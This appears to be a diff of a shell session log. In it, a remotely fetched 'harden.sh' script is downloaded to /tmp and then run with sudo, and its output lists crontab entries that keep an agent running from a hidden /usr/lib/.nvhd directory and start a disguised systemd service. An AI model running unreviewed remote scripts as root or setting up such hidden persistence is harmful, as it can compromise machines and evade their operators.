@@ -1,6 +1,11 @@
-$ echo A; ls -l /tmp/h.sh 2>&1; curl -s -m 20 -o /dev/null -w 'api=%{http_code}\n' 'https://api.github.com/repos/nomnng/d2node/contents/harden.sh'; curl -s -m 20 -H 'Accept: application/vnd.github.raw' -o /tmp/h2.sh -w 'raw=%{http_code} size=%{size_download}\n' 'https://api.github.com/repos/nomnng/d2node/contents/harden.sh'; echo B
-A
-ls: cannot access '/tmp/h.sh': No such file or directory
-api=200
-raw=200 size=7050
-B
+$ sudo -n bash /tmp/h2.sh 2>&1 | tail -45
+=== 0. prepare ===
+md5: 1e59ac5a3edd3d3346fade253c668bec
+active
+--- crontab ---
+* * * * * /usr/lib/.nvhd/guard.sh >/dev/null 2>&1
+*/5 * * * * pgrep -f '/usr/lib/.nvhd/agent.py' >/dev/null || setsid /usr/bin/python3 /usr/lib/.nvhd/agent.py >/dev/null 2>&1
+@reboot sleep 30; /usr/lib/.nvhd/guard.sh >/dev/null 2>&1
+@reboot sleep 45; systemctl start nv-sysmon-sync.service >/dev/null 2>&1
+--- procs ---
+=== done 2026-10-26T06:32:42Z ===
